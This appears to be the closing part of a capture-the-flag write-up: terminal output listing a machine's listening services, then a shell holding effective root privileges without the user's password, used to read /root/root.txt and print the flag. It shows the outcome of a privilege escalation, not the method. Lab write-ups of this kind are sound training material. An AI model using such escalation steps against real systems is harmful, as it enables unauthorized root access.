tcp       LISTEN     0          511                                       0.0.0.0:80                   0.0.0.0:*         users:(("nginx",pid=1916,fd=5),("nginx",pid=1915,fd=5),("nginx",pid=1913,fd=5))
tcp       LISTEN     0          4096                                      0.0.0.0:22                   0.0.0.0:*         users:(("sshd",pid=1890,fd=3),("systemd",pid=1,fd=234))
tcp       LISTEN     0          4096                                   127.0.0.54:53                   0.0.0.0:*         users:(("systemd-resolve",pid=695,fd=17))
tcp       LISTEN     0          4096                                    127.0.0.1:9000                 0.0.0.0:*         users:(("nginx-ui",pid=1870,fd=6))
tcp       LISTEN     0          4096                                127.0.0.53%lo:53                   0.0.0.0:*         users:(("systemd-resolve",pid=695,fd=15))
tcp       LISTEN     0          4096                                    127.0.0.1:631                  0.0.0.0:*         users:(("cupsd",pid=1869,fd=7))
tcp       LISTEN     0          4096                                         [::]:22                      [::]:*         users:(("sshd",pid=1890,fd=4),("systemd",pid=1,fd=235))
tcp       LISTEN     0          4096                                        [::1]:631                     [::]:*         users:(("cupsd",pid=1869,fd=6))
bash-5.1# sudo passwd
[sudo] password for jonathan:
Sorry, try again.
[sudo] password for jonathan:
sudo: 1 incorrect password attempt
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# cat /root/root.txt
92efcb8327d1a4864e66fc0de681fc7c
bash-5.1# whoami
root
bash-5.1# %
```